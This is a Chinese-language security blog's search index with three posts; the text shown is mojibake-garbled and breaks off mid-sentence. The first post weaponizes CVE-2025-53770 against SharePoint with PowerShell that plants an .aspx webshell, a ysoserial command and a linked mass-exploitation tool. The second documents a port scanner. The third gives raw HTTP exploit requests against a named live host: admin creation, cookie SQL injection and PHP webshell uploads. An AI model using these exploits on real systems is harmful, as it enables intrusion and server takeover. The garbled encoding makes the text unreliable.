<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å®æˆ˜CVE-2025-53770æ¼æ´è®²è§£å®æˆ˜å‘ç‚¹å¹¶ä¸”æ­¦å™¨åŒ–æ‰ç›´æ¥é›†æˆåˆ°æˆ‘ä»¬çš„webframeworktoolså®ç°ä¸€é”®æ‰¹é‡getshellå±•ç¤º</title>
      <link href="/securitytools/2025/07/articles/5e8ed1a8f96203bb/"/>
      <url>/securitytools/2025/07/articles/5e8ed1a8f96203bb/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å‡ å¤©å…³äºCVE-2025-53770 ååºåˆ—åŒ–æ¼æ´åœ¨å„ä¸ªå…¬ä¼—å·ç¾¤é‡Œé¢è®¨è®ºã€‚åŒ…æ‹¬åœ¨é£æœºç¾¤é‡Œé¢ä¹Ÿè¯´è¿™ä¸ªæ¼æ´å¯è°“æ˜¯å¾ˆç«ã€‚é£æœºç¾¤é‡Œé¢è¯´çš„æ˜¯è¿™ä¸ªæ¼æ´å•çº¯ä½¿ç”¨ysoserial.exe ç”Ÿæˆåˆ©ç”¨ä¸å¤ªå¯èƒ½ç¡®å®æ˜¯è¿™æ ·çš„ã€‚é‡Œé¢è¿˜åŒ…å« xmlç­‰ã€‚æ‰€ä»¥è¿™å°±ç»™å®æˆ˜å·¥ä½œå¸¦æ¥äº†å¾ˆå¤§å›°æ‰°ã€‚æˆ‘ä»¬çŸ¥é“æ—¢ç„¶æ˜¯ååºåˆ—åŒ–æ¼æ´æˆ‘ä»¬å¿…é¡»éµå®ˆååºåˆ—åŒ–çš„è§„åˆ™æ—¢ç„¶ä¸èƒ½ç›´æ¥ç”Ÿæˆexpæˆ‘ä»¬å¯ä»¥é—´æ¥ç”Ÿæˆexpã€‚é€šè¿‡æˆ‘åœ¨youtube å‘å¸ƒçš„è§†é¢‘å¯ä»¥çŸ¥é“è§†é¢‘åœ°å€<br/><br><a href="https://www.youtube.com/watch?v=gITPNrJpZmE">https://www.youtube.com/watch?v=gITPNrJpZmE</a> <br/><br>è¦æƒ³é—´æ¥çš„æå¿…é¡»è¦åœ¨å­—èŠ‚æ–¹é¢ä¸‹åŠŸå¤«æ‰€ä»¥æˆ‘ç ”ç©¶äº†ä¸€ä¸‹æœ€ç»ˆå†™å‡ºäº†åˆ©ç”¨æ­¥éª¤ã€‚æ–‡ç« å¤§æ¦‚è¯´ä¸€ä¸‹ã€‚å…·ä½“å»youtubeçœ‹è§†é¢‘å°±è¡Œäº†ã€‚æˆ‘å¤§æ¦‚åˆ†ä¸ºä¸‰æ­¥è¿›è¡Œé—´æ¥åˆ©ç”¨ã€‚åœ¨ä¸ç ´ååŸæ¥ååºåˆ—åŒ–çš„ç»“æ„ä»å­—èŠ‚æ–¹é¢åˆ†æåˆ©ç”¨è¿‡ç¨‹ã€‚ä¸æ‡‚çš„çœ‹youtubeè§†é¢‘æ•™ç¨‹ã€‚</p><h2 id="1-å¦‚ä½•ç”Ÿæˆpowershellåˆ©ç”¨ç¨‹åº"><a href="#1-å¦‚ä½•ç”Ÿæˆpowershellåˆ©ç”¨ç¨‹åº" class="headerlink" title="(1)å¦‚ä½•ç”Ÿæˆpowershellåˆ©ç”¨ç¨‹åº"></a>(1)å¦‚ä½•ç”Ÿæˆpowershellåˆ©ç”¨ç¨‹åº</h2><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># å°†è„šæœ¬å†…å®¹æ”¾å…¥å˜é‡ä¸­</span><span class="token variable">$script</span> = @<span class="token string">'$base64String = "aaaa"$destinationFile = "C:\PROGRA~1\COMMON~1\MICROS~1\WEBSER~1\16\TEMPLATE\LAYOUTS\ddd.aspx"$decodedBytes = [System.Convert]::FromBase64String($base64String)$decodedContent = [System.Text.Encoding]::UTF8.GetString($decodedBytes)$decodedContent | Set-Content -Path $destinationFile -ErrorAction Stop'</span>@<span class="token comment"># å°†è„šæœ¬å†…å®¹ç¼–ç ä¸º Base64</span><span class="token variable">$bytes</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$script</span><span class="token punctuation">)</span><span class="token variable">$base64Command</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">)</span><span class="token comment"># è¾“å‡ºç¼–ç åçš„ Base64 å­—ç¬¦ä¸²</span><span class="token variable">$base64Command</span></code></pre><p>ä¸Šé¢æ›¿æ¢æˆä½ è‡ªå·±çš„æ–‡ä»¶å†…å®¹å’Œæ–‡ä»¶åç§°ã€‚å…¶ä¸­æ–‡ä»¶åç§°éœ€è¦éµå¾ª<br>æ–‡ä»¶åç§°:å¿…é¡»10ä¸ªå­—ç¬¦<br/><br>æ–‡ä»¶å†…å®¹: 754ä¸ªå­—ç¬¦<br/><br>å…·ä½“æˆªå›¾å¦‚ä¸‹:$base64String å¿…é¡»æ˜¯754ä¸ªå­—ç¬¦ã€‚æ„é€ å¥½äº†ä»¥åç¼–ç ä»¥åã€‚è‡ªå·±å†æ¬¡è§£ç ã€‚çœ‹çœ‹è§£ç ä»¥åæ˜¯å¦æ˜¯754ä¸ªå­—ç¬¦ã€‚å¦å¤–æ–‡ä»¶åç§°ä¹Ÿå¿…é¡»æ˜¯10ä¸ªã€‚å› ä¸ºæˆ‘ä»¬æ˜¯å¥—å£³åˆ«äººçš„ä¸œè¥¿æ‰€ä»¥è¦éµå®ˆè§„åˆ™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240130501.png" alt="base64Stringå†…å®¹"><br>ä½¿ç”¨powershell ç”Ÿæˆ yso æ‰€éœ€è¦çš„exp<br>powershell -ExecutionPolicy Bypass -File 1.ps1<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240133565.png" alt="ç”Ÿæˆbase64"><br>æµ‹è¯•ä¸€ä¸‹ã€‚å®Œæˆç¬¬ä¸€æ­¥expæ„é€ <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240135250.png" alt="æˆåŠŸæ ‡å¿—"></p><h2 id="2-å¦‚ä½•ä½¿ç”¨ysoserial-exe-ç”Ÿæˆåˆ©ç”¨ä»£ç "><a href="#2-å¦‚ä½•ä½¿ç”¨ysoserial-exe-ç”Ÿæˆåˆ©ç”¨ä»£ç " class="headerlink" title="(2)å¦‚ä½•ä½¿ç”¨ysoserial.exe ç”Ÿæˆåˆ©ç”¨ä»£ç "></a>(2)å¦‚ä½•ä½¿ç”¨ysoserial.exe ç”Ÿæˆåˆ©ç”¨ä»£ç </h2><p>ä½¿ç”¨githubæœ€æ–°ç‰ˆæœ¬ç”Ÿæˆexpï¼š<br>ysoserial.exe -o base64 -g åˆ©ç”¨é“¾ -f æ ¼å¼ -c â€œpowershell -EncodedCommand  ç¬¬ä¸€æ­¥ç”Ÿæˆçš„base64<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240139716.png" alt="ä½¿ç”¨ysoç”Ÿæˆexp"><br>æˆ‘ä»¬çœ‹åˆ°ç”Ÿæˆçš„expä»¥&#x2F;wEywC0AAQAAå¼€å¤´ã€‚</p><h2 id="3-å¦‚ä½•æŠŠysoç”Ÿæˆçš„base64æ•°æ®å˜æˆexpå‘¢"><a href="#3-å¦‚ä½•æŠŠysoç”Ÿæˆçš„base64æ•°æ®å˜æˆexpå‘¢" class="headerlink" title="(3)å¦‚ä½•æŠŠysoç”Ÿæˆçš„base64æ•°æ®å˜æˆexpå‘¢"></a>(3)å¦‚ä½•æŠŠysoç”Ÿæˆçš„base64æ•°æ®å˜æˆexpå‘¢</h2><p>è¿™é‡Œæ¶‰åŠåˆ°äº†äºŒè¿›åˆ¶æ“ä½œæˆ‘ä»¬å¯ä»¥æ›¿æ¢äºŒè¿›åˆ¶ã€‚å…·ä½“æ¯”è¾ƒå¤æ‚æˆ‘ç›´æ¥å†™äº†ä¸ªåˆ©ç”¨å·¥å…·ã€‚ç›´æ¥æŠŠç¬¬äºŒæ­¥ç”Ÿæˆçš„æ”¾åˆ°payload.txté‡Œé¢ç„¶åè¿è¡Œå·¥å…·è‡ªåŠ¨æ„é€ expã€‚<br/>ä¸‹è½½åœ°å€:<a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.5-enhance/releases/tag/CVE-2025-53770exptools">https://github.com/peiqiF4ck/WebFrameworkTools-5.5-enhance/releases/tag/CVE-2025-53770exptools</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240143123.png" alt="ç¬¬äºŒæ­¥ç”Ÿæˆçš„ç›´æ¥æ”¾åˆ°å·¥å…·é‡Œé¢"><br>æ„é€ å‡ºæ¥ä»¥åç›´æ¥æ”¾åˆ°burpé‡Œé¢åˆ©ç”¨å°±è¡Œäº†ã€‚è‡³äºè¿”å›ç»“æœæœ‰çš„æ˜¯200æœ‰çš„æ˜¯302ã€‚ä¸»è¦æ˜¯çœ‹æ–‡ä»¶ç”Ÿæˆæ²¡æœ‰ã€‚æœ€ç»ˆæ•ˆæœ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240146443.png" alt="expç”Ÿæˆæ•ˆæœ"><br>è‡³äºexpé‡Œé¢çš„MSOTlPn_Uri&#x3D;http%3A%2F%2F<a href="http://www.itsc.org/">www.itsc.org</a> çš„urlå¯ä»¥æ¢æˆç›®æ ‡çš„å¯ä»¥åŸæ¥çš„ä¸å½±å“ç›´æ¥æ‰“å°±è¡Œäº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240149453.png" alt="æ”»å‡»æ•ˆæœ"><br>ç›´æ¥ä¸Šwebshelläº†<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240151319.png" alt="webshell"></p><h2 id="æ­¦å™¨åŒ–"><a href="#æ­¦å™¨åŒ–" class="headerlink" title="æ­¦å™¨åŒ–"></a>æ­¦å™¨åŒ–</h2><p>æˆ‘ä»¬ç›´æ¥æ­¦å™¨åŒ–äº†ã€‚å¦‚ä¸‹å›¾æˆ‘ä¼°è®¡æˆ‘ä»¬æ˜¯é™¤äº†æ¼æ´å‘ç°è€…å’Œé¦–æ¬¡åˆ©ç”¨è€…ã€‚æˆ‘ä»¬ç®—æ¯”è¾ƒå¿«çš„ç›´æ¥ä¸Šwebshellçš„äº†åŒæ—¶åº”è¯¥ä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´å‡ºæ¥å®æˆ˜æ¯”è¾ƒæˆåŠŸçš„<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202507240153621.png" alt="webshell"><br>ç›´æ¥é›†æˆåˆ°æˆ‘ä»¬çš„webframeworktools å·¥å…·æ­¤å·¥å…·ä¹‹å‰å·²ç»æµ‹è¯•å¯ä»¥è·‘å‡ ç™¾ä¸‡ç”šè‡³ä¸Šåƒä¸‡ç½‘ç«™ã€‚å¯¹æºç æ„Ÿå…´è¶£çš„è¯·çœ‹github é¢‘é“ã€‚åªæœ‰5.3ç‰ˆæœ¬çš„å…¶ä»–ç‰ˆæœ¬çš„ä»£ç æš‚æ—¶ä¸å‡ºã€‚ä»¥ååˆ†äº«åœ¨youtube å’Œgithubä¼˜å…ˆåšå®¢æ¬¡ä¹‹ã€‚é¢‘é“æ›´æ¬¡ä¹‹ã€‚ä¸ä¼šä¸æ‡‚å¾—çœ‹è§†é¢‘æ•™ç¨‹å§ã€‚<br>ç°åœ¨æœ€æ–°ç‰ˆæœ¬5.5 å¢å¼ºç‰ˆæœ¬å¢åŠ  ç«¯å£æ‰«æ ç›®å½•æ‰«æ æŒ‡çº¹è¯†åˆ« webtitleè¯†åˆ«ç­‰å››ä¸ªæ¨¡å—ã€‚å…·ä½“çœ‹youtubeè§†é¢‘å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebFrameworkToolsä¹‹ç«¯å£æ‰«æå·¥å…·PortScan</title>
      <link href="/securitytools/2025/05/articles/3e7baa245191c451/"/>
      <url>/securitytools/2025/05/articles/3e7baa245191c451/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æ­¤å‰æˆ‘ä»¬å¼€å‘çš„å·¥å…·WebFrameworkTools ä¸“æ³¨äºexppoc,åœ¨æ¸—é€å®æˆ˜æˆ–è€…æ”»é˜²æ¼”ç»ƒä¸­å‘ç°ä¿¡æ¯æ”¶é›†èµ„äº§æ”¶é›†ã€‚ç‰¹åˆ«æ˜¯è¿›å»å†…ç½‘ä»¥åçš„ä¿¡æ¯æ”¶é›†ã€‚å°¤ä¸ºé‡è¦ã€‚ç”¨å…¶ä»–çš„ç«¯å£æ‰«æå·¥å…·ä¾‹å¦‚fscan,mascan,nmapè¿™äº›ä¸æ˜¯è¢«å®‰å…¨è½¯ä»¶æ ‡è®°å°±æ˜¯è¾¾ä¸åˆ°é¢„æœŸçš„æ•ˆæœã€‚å¦å¤–è¿™äº›å·¥å…·è¾“å…¥çš„å‚æ•°å¤ªè¿‡äºå¤æ‚å¯¹äºæ–°æ‰‹ä¸å¤ªå‹å¥½ã€‚æˆ‘ä»¬ä¸€è´¯ç§‰æ‰¿çš„åŸåˆ™å°±æ˜¯å·¥å…·èƒ½ç®€å•ç»ä¸æå¤æ‚ã€‚å¦å¤–è¿™äº›å·¥å…·æœ‰ä¸ªç‰¹ç‚¹å°±æ˜¯åªæ˜¾ç¤ºæ‰«ææˆåŠŸçš„ç»“æœã€‚è¿™æ ·å¯¼è‡´æˆ‘ä»¬æ— æ³•åˆ¤æ–­æ‰«ææœ‰æ²¡æœ‰ç»“æŸ,æˆ–è€…æ˜¯å¦æ˜¯è½¯ä»¶å¡é¡¿ç­‰æƒ…å†µã€‚äºæ˜¯æˆ‘ä»¬èŠ±äº†ç‚¹æ—¶é—´è‡ªå·±å¼€å‘äº†ä¸€æ¬¾ç«¯å£æ‰«æå·¥å…·ã€‚å¦å¤–æˆ‘åœ¨é€›youtubeå‘ç°æœ‰äº›äººä½¿ç”¨sæ‰«æå™¨æ‰«æç«¯å£å¼€äº†å‡ ä¸ªå‘ç°å¤ªå¡äº†ã€‚å¯¼è‡´è¿™æ ·çš„åŸå› æ˜¯å¤§æ®µæ‰¹é‡æ‰«æå ç”¨å¤§é‡cpuå†…å­˜æ‰€ä»¥ã€‚å‡ºç°å¡é¡¿ã€‚å…·ä½“è¯·çœ‹æˆ‘ä»¬çš„é¢‘é“å§ã€‚æ¥ä¸‹æ¥æˆ‘ä»‹ç»ä¸€ä¸‹æˆ‘ä»¬è½¯ä»¶çš„ç”¨æ³•ã€‚åç»­å°†é›†æˆåˆ°ã€‚WebFrameworkToolsé‡Œé¢ã€‚</p><h2 id="è½¯ä»¶ç”¨æ³•ä»‹ç»"><a href="#è½¯ä»¶ç”¨æ³•ä»‹ç»" class="headerlink" title="è½¯ä»¶ç”¨æ³•ä»‹ç»"></a>è½¯ä»¶ç”¨æ³•ä»‹ç»</h2><p>å£æ‰«æå·¥å…·åç»­å°†é›†æˆåˆ°webframeworktoolså·¥å…·é‡Œé¢è¿™é‡Œå…ˆå•ç‹¬å¼€ä¸€ä¸ªé¡¹ç›®å§</br><br>è½¯ä»¶æˆªå›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202505311855630.png" alt="ç«¯å£æ‰«æåŠ¨æ€æµ‹è¯•æˆªå›¾"><br>ç«¯å£æ‰«æ</br><br>ç”¨æ³•: Scan.exe -ip &lt;IP|ip.txt&gt; -port &lt;Port|port.txt&gt; [-thread <Threads>] [-timeout <Timeout>] [-banner &lt;yes|no&gt;] [-type &lt;ping|tcp&gt;] [-export <Port>]</br><br>Author:peiqiF4ck  <a href="https://peiqif4ck.github.io/">https://peiqif4ck.github.io/</a></br><br>ipåœ°å€å¯ä»¥æ˜¯txtæ–‡ä»¶ä¸€è¡Œä¸€ä¸ªä¹Ÿå¯ä»¥æ˜¯ipåœ°å€</br><br>portç«¯å£å·å¯ä»¥æ˜¯txtæ–‡ä»¶ä¸€è¡Œä¹Ÿå¯ä»¥æ˜¯ç«¯å£å·</br><br>export(æ’é™¤çš„ç«¯å£å·)åªèƒ½æ˜¯ç«¯å£å·ä¸æ”¯æŒtxt</br><br>ipæ”¯æŒæ ¼å¼:192.168.1.1,192.168.1.1-255,192.168.1.1-192.168.1.255,192.168.1.1,192.168.1.2,192.168.1.1&#x2F;24&#x2F;8&#x2F;16</br><br>ç«¯å£å·æ”¯æŒ,å’Œ-æ ¼å¼80,81æˆ–è€…81-82.é»˜è®¤ç«¯å£è¶…æ—¶æ—¶é—´ä¸º9000ã€‚å¦‚æœè¾“å…¥20ä»¥ä¸‹çš„æ•°å­—é‚£ä¹ˆå°±æ˜¯9000ã€‚å¦åˆ™å°±æ˜¯ä½ è¾“å…¥çš„è¶…æ—¶æ—¶é—´ã€‚å¦‚æœæƒ³åŠ è¯·æŒ‡å®šå‚æ•°-timeout 10000</br><br>é»˜è®¤ä½¿ç”¨tcpæ‰«æå¹¶ä¸”è¯†åˆ«bannerä¿¡æ¯,å¦‚æœæƒ³ä½¿ç”¨pingæ¢æ´»ä¹‹ååœ¨æ‰«æè¯·åŠ -typeæŒ‡å®šä¸ºping</br><br>é»˜è®¤çº¿ç¨‹20æ›´æ”¹çº¿ç¨‹æ•°-thread 100,ä¸è¯†åˆ«banneråªç«¯å£æ‰«ææŒ‡å®šå‚æ•°-banner no </br><br>éƒ¨åˆ†å‚æ•°ç”¨æ³•</br><br>Scan.exe -ip 192.168.1.1 -port 80 -thread 100 -timeout 9000 -banner no -type ping -export 80</br><br>Scan.exe -ip 192.168.1.1 -port 80 -thread 100 </br><br>Scan.exe -ip 192.168.1.1 -port 80  -timeout 9000</br><br>Scan.exe -ip 192.168.1.1 -port 80  -type ping</br><br>Scan.exe -ip 192.168.1.1</br><br>Scan.exe -ip ip.txt -port port.txt</br><br>ç«¯å£æ‰«æ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202505311630321.gif" alt="ç«¯å£æ‰«æåŠ¨æ€æµ‹è¯•æˆªå›¾"></p><p>è§†é¢‘æ•™ç¨‹<br><a href="https://www.youtube.com/watch?v=W3aJ4n5u0jg">https://www.youtube.com/watch?v=W3aJ4n5u0jg</a></br></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¸—é€æ”»å‡»ç¬¬ä¸€æ­¥å°±æ˜¯ä¿¡æ¯æ¢æµ‹ã€‚æ¢æµ‹å“ªäº›ç«¯å£å¼€æ”¾ä½œä¸ºå…¥ä¾µçš„é¦–é€‰ã€‚æ‰€ä»¥æœ‰ä¸ªè¶æ‰‹çš„ç«¯å£æ‰«æå·¥å…·å¾ˆæœ‰å¿…è¦å°±è¿™å§ã€‚å…¶ä»–è¯·çœ‹è§†é¢‘æ•™ç¨‹ã€‚å¦å¤–ç«¯å£æ‰«æçš„ä»£ç åç»­ä¹Ÿä¼šå‡ºçš„ã€‚åç»­è¯·å¤šå¤šå…³æ³¨é¢‘é“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸh5å•†åŸæ¼æ´æ¢ç©¶å¤–åŠ æºç </title>
      <link href="/penetrationtest/2025/04/articles/aaca2e7fa3565312/"/>
      <url>/penetrationtest/2025/04/articles/aaca2e7fa3565312/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¿»ç¬”è®°ç¿»åˆ°äº†å»å¹´7æœˆä»½æçš„ç«™ç‚¹,è¿™ä¸ªæ¼æ´å¿˜äº†ä»å“ªé‡Œçœ‹åˆ°çš„äº†æˆ‘ç¨å¾®åŠ å·¥äº†åŠ å·¥ã€‚ç°åœ¨å…¬å¸ƒå‡ºæ¥ã€‚è¿™ä¸ªæ¼æ´ç®€å•æ–¹ä¾¿å­¦ä¹ ä»£ç å®¡è®¡ã€‚é—²è¯ä¸å¤šè¯´ç›´æ¥æ”¾expã€‚ç”±äºæ˜¯å»å¹´çš„æ¼æ´ç°åœ¨ç½‘ç«™å·²ç»å…³é—­å›¾ç‰‡æ²¡æœ‰é©¬èµ›å…‹ç›´æ¥ä¸€é•œåˆ°åº•ã€‚ä½è°ƒä½¿ç”¨ã€‚è¯·å‹¿ä½¿ç”¨æ¼æ´éæ³•æ”»å‡»ç½‘ç«™ã€‚å‘å¸ƒæºä»£ç ä»…æä¾›å­¦ä¹ ç ”ç©¶ã€‚ä¸è¦ä½¿ç”¨å…¬å¼€çš„expæ”»å‡»äº’è”ç½‘ç½‘ç«™ã€‚</p><h2 id="æ·»åŠ ç®¡ç†å‘˜"><a href="#æ·»åŠ ç®¡ç†å‘˜" class="headerlink" title="æ·»åŠ ç®¡ç†å‘˜"></a>æ·»åŠ ç®¡ç†å‘˜</h2><pre class="language-sh" data-language="sh"><code class="language-sh">POST &#x2F;admin&#x2F;api.php HTTP&#x2F;1.1Host: 1.117.76.188:88Content-Length: 135Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8Origin: http:&#x2F;&#x2F;1.117.76.188:88Referer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;admin&#x2F;wz_sz&#x2F;adminSet.phpAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: keep-aliveadmin&#x3D;true&amp;name&#x3D;%E8%B4%BA%E5%AE%87%E5%B9%B2%E9%B2%9C&amp;username&#x3D;admin123&amp;password&#x3D;admin123456&amp;pwd&#x3D;admin123456&amp;qq&#x3D;31393231&amp;wx&#x3D;152485399612</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011518752.png" alt="æµ‹è¯•æˆªå›¾"></p><h2 id="åå°cookieæ³¨å…¥"><a href="#åå°cookieæ³¨å…¥" class="headerlink" title="åå°cookieæ³¨å…¥"></a>åå°cookieæ³¨å…¥</h2><pre class="language-shell" data-language="shell"><code class="language-shell">GET &#x2F;admin&#x2F;index.php?id&#x3D;user HTTP&#x2F;1.1Host: 1.117.76.188:88Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: username&#x3D;admin&#39;+or+true#Connection: keep-aliveReferer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;admin&#x2F;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011521502.png" alt="æµ‹è¯•æˆªå›¾"></p><h2 id="æ–‡ä»¶ä¸Šä¼ ä¸€"><a href="#æ–‡ä»¶ä¸Šä¼ ä¸€" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä¸€"></a>æ–‡ä»¶ä¸Šä¼ ä¸€</h2><pre class="language-sh" data-language="sh"><code class="language-sh">POST &#x2F;admin&#x2F;commodtiy&#x2F;file.php?upload&#x3D;1 HTTP&#x2F;1.1Host: 1.117.76.188:88Content-Length: 405Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryHA1b60Dgi0g9WBtfOrigin: http:&#x2F;&#x2F;1.117.76.188:88Referer: http:&#x2F;&#x2F;1.117.76.188:88&#x2F;user&#x2F;Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: keep-alive------WebKitFormBoundaryHA1b60Dgi0g9WBtfContent-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.png&quot;Content-Type: image&#x2F;pngdfffs------WebKitFormBoundaryHA1b60Dgi0g9WBtf--</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202504011525605.png" alt="æµ‹è¯•æˆªå›¾"><br>ä¸Šä¼ æˆåŠŸè¿”å› â€œ/admin/commodtiy/upload/xxxxxxx.phpâ€</p><h2 id="æ–‡ä»¶ä¸Šä¼ äºŒ"><a href="#æ–‡ä»¶ä¸Šä¼ äºŒ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ äºŒ"></a>æ–‡ä»¶ä¸Šä¼ äºŒ</h2><pre class="language-none"><code class="language-none">POST &#x2F;admin&#x2F;file.php HTTP&#x2F;2Host: qiminggay.icuCookie: yzm&#x3D;FFB8Content-Length: 426Sec-Ch-Ua: &quot;Chromium&quot;;v&#x3D;&quot;122&quot;, &quot;Not(A:Brand&quot;;v&#x3D;&quot;24&quot;, &quot;Google Chrome&quot;;v&#x3D;&quot;122&quot;Sec-Ch-Ua-Platform: &quot;Windows&quot;Sec-Ch-Ua-Mobile: ?0User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;122.0.6261.95 Safari&#x2F;537.36Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryNDfqoHwYfPZ51LSAAccept: *&#x2F;*Origin: https:&#x2F;&#x2F;qiminggay.icuSec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: https:&#x2F;&#x2F;qiminggay.icu&#x2F;admin&#x2F;commodtiy&#x2F;index.php?page&#x3D;1Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q&#x3D;0.9------WebKitFormBoundaryNDfqoHwYfPZ51LSAContent-Disposition: form-data; name&#x3D;&quot;wangeditor-uploaded-image&quot;; filename&#x3D;&quot;test.php&quot;Content-Type: image&#x2F;pngdfdsafsfsad------WebKitFormBoundaryNDfqoHwYfPZ51LSA--</code></pre><p>ä¸Šä¼ æˆåŠŸåè¿”å›<br>{<br>    â€œerrnoâ€:0,<br>    â€œdataâ€:{<br>        â€œurlâ€:â€&#x2F;upload&#x2F;xxxxx.phpâ€,<br>        â€œaltâ€:â€ â€œ,<br>        â€œhrefâ€:â€ â€œ<br>    }<br>}</p><p>å¦å¤–ä¼šæä¾›è¿™ä¸ªh5å•†åŸçš„æºä»£ç ã€‚ä¾›ä»£ç å®¡è®¡å­¦ä¹ ã€‚å…³äºä»£ç å®¡è®¡å­¦ä¹ å¦‚ä½•èƒ½ç‹¬ç«‹å®¡è®¡ä»£ç ã€‚é¦–å…ˆå­¦ä¹ ä»£ç å®¡è®¡éœ€è¦å­¦ä¹ åŸºç¡€è¯­è¨€ã€‚è¿™æ ·å¯ä»¥å®¡è®¡ç®€å•çš„æ¼æ´ã€‚åç»­åœ¨ç ”ç©¶æ¡†æ¶æ¼æ´æ¸—é€æµ‹è¯•ã€‚å¦‚æœå¯¹æ¡†æ¶å®¡è®¡æœ‰æµ“åšçš„å…´è¶£å¯ä»¥åç»­ã€‚å¯¹æ¡†æ¶æ¼æ´è¿›è¡Œç ”ç©¶ä¸æ¨èå› ä¸ºè€—æ—¶ã€‚å¹¶ä¸”éœ€è¦æ·±åšçš„åŠŸåŠ›ã€‚è¾¾åˆ°å¯ä»¥é€šè¿‡è¡¥ä¸diffå‡ºexpå°±è¡Œäº†ã€‚èƒ½è¾¾åˆ°è¿™ä¸ªæ°´å¹³ä¹Ÿå¾ˆç‰›é€¼äº†ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ€è¿‘AIæ¯”è¾ƒç«æ¯”å¦‚deepseekä»€ä¹ˆçš„æœ‰äººè¯´å¯ä»¥ç»“åˆaiå¯¹ä»£ç è¿›è¡Œå®¡è®¡ã€‚ç›®å‰æ¥è¯´å¯èƒ½æ•ˆæœå¹¶ä¸æ˜¯å¥½çš„ä½†æ˜¯åç»­çœ‹è‚¯å®šæ˜¯æ²¡é—®é¢˜çš„ã€‚æœ‰éœ€è¦äº†è§£aiå®¡è®¡çš„å¯ä»¥åœ¨githubä¸­å¯»æ‰¾ä»£ç å®¡è®¡çš„é¡¹ç›®starä»¥åçœ‹çœ‹ã€‚æ€»çš„æ¥è¯´aiæ˜¯è¾…åŠ©ä½ 